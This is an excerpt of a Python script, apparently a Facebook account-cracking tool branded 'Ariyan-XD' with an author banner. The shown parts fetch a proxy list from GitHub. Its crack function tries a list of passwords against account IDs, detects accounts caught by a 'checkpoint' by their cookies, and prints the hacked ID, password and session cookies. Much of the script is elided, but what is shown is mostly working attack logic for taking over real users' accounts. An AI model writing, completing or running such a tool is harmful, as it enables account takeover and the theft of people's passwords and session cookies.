...
princp=[]
try:
	prox= requests.get('https://github.com/ariyan600530/RT/tree/main').text
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mARIYAN AHMED ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Tutul King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mAriyan-King ]   ║\33[1;34m   
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[Ariyan-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				#Tutul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•Ariyan-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
